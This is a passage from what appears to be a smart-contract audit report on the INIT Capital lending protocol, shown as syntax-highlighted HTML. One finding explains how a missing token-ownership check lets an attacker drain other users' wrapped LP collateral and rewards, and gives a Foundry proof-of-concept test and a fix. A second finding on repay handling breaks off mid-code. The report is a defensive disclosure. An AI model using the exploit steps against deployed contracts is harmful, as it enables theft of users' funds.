class=\"mtk1\">250:         </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">251:         </span><span class=\"mtk11\">onlyCore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">252:         </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">253:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">254</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">PosCollInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">posCollInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">__posCollInfos</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">255</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// NOTE: balanceOfLp should be 1:1 with amt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">256</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newWLpAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IBaseWrapLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOfLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">_amt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">257</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newWLpAmt</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">258</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">posCollInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">].</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NOT_CONTAIN</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">259</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">posCollInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collCount</span><span class=\"mtk1\"> -= </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">260</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">posCollInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">].</span><span class=\"mtk11\">length</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">261</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">posCollInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">.</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">262</span><span class=\"mtk1\">:             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">263</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">isCollateralized</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">264</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">265</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_harvest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">266</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">IBaseWrapLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">).</span><span class=\"mtk11\">unwrap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">267</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">268</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>This function could be called only from the core contract using the <code>decollateralizeWLp</code> and <code>liquidateWLp</code> functions. However, it fails to check if the specified <code>tokenId</code> belongs to the current position, this check would take place only if removing is full - meaning no lp tokens remain wrapped in the wLp (line 257).</p>\n<p>This would allow anyone to drain any other positions with supplied wLp tokens. The attacker only needs to create its own position, supply dust amount in wLp to it, and call <code>decollateralizeWLp</code> with the desired ‘tokenId’, also withdrawn amount should be less than the full wLp balance to prevent check on line 257. An attacker would receive almost all lp tokens and accrued rewards from the victim’s wLp.</p>\n<p>A similar attack for harvesting the victim’s rewards could be done through the <code>liquidateWLp</code> function.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Attacker could drain any wLp token and harvest all accrued rewards for this token.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The next test added to the <code>tests/wrapper/TestWLp.sol</code> file could show an exploit scenario:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testExploitStealWlp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">victimAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100000000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Bob open position with &#39;tokenId&#39; 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bobPosId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_openPositionWithLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BOB</span><span class=\"mtk1\">, </span><span class=\"mtk12\">victimAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Alice open position with &#39;tokenId&#39; 2 and dust amount </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alicePosId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_openPositionWithLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Alice successfully de-collateralizes her own position using Bob&#39;s &#39;tokenId&#39; and amounts less than Bob&#39;s position by 1 to prevent a revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">initCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decollateralizeWLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alicePosId</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mockWLpUniV2</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">victimAmt</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">positionManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollWLpAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bobPosId</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mockWLpUniV2</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lp</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider adding a check that position holds the specified token into the <code>removeCollateralWLpTo</code> function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">__posCollInfos</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_wlp</span><span class=\"mtk1\">].</span><span class=\"mtk11\">contains</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NOT_CONTAIN</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/31#issuecomment-1870313456\">fez-init (INIT) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-03-_handlerepay-of-moneymarkethook-does-not-consider-the-actual-debt-shares-of-the-posid-inside-the-position-manager-and-could-lead-to-a-users-tokens-getting-stuck-inside-the-hook\" style=\"position:relative;\"><a href=\"#h-03-_handlerepay-of-moneymarkethook-does-not-consider-the-actual-debt-shares-of-the-posid-inside-the-position-manager-and-could-lead-to-a-users-tokens-getting-stuck-inside-the-hook\" aria-label=\"h 03 _handlerepay of moneymarkethook does not consider the actual debt shares of the posid inside the position manager and could lead to a users tokens getting stuck inside the hook permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/28\">[H-03] <code>_handleRepay</code> of <code>MoneyMarketHook</code> does not consider the actual debt shares of the <code>posId</code> inside the position manager and could lead to a user’s tokens getting stuck inside the hook</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/28\">said</a></em></p>\n<p>When users construct repay operations via <code>MoneyMarketHook</code>, it doesn’t consider the actual debt shares of the position inside the <code>InitCore</code> and <code>PosManager</code>. This could lead to users’ tokens getting stuck inside the <code>MoneyMarketHook</code> contract.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When users want to repay his positions in <code>MoneyMarketHook</code>, they can provide the parameters inside <code>repayParams</code>, and <code>MoneyMarketHook</code> will construct the operation via <code>_handleRepay</code> function.</p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L145-L159\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L145-L159</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_handleRepay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_offset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_initPosId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">RepayParams</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">underlyingToken</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;         </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">repayAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">debtShareToAmtCurrent</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_ensureApprove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">repayAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;         </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">repayAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_offset</span><span class=\"mtk1\">] =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IInitCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">repay</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_initPosId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_offset</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_offset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_offset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>It can be observed that it calculates the <code>repayAmt</code> based on the shares provided by the users and transfers the corresponding amount of tokens from the sender to the hook. However, the actual debt shares of the position can be less than the <code>_params[i].shares</code> provided by users. This means that the actual repay amount of tokens needed could be less than the calculated <code>repayAmt</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L530-L551\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L530-L551</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IConfig</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenToRepay</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check status</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPoolConfig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">canRepay</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getModeStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">).</span><span class=\"mtk12\">canRepay</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">REPAY_PAUSED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// get position debt share</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;     </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positionDebtShares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPosManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getPosDebtShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;     </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sharesToRepay</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">positionDebtShares</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">positionDebtShares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// get amtToRepay (accrue interest)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;     </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amtToRepay</span><span class=\"mtk1\"> = 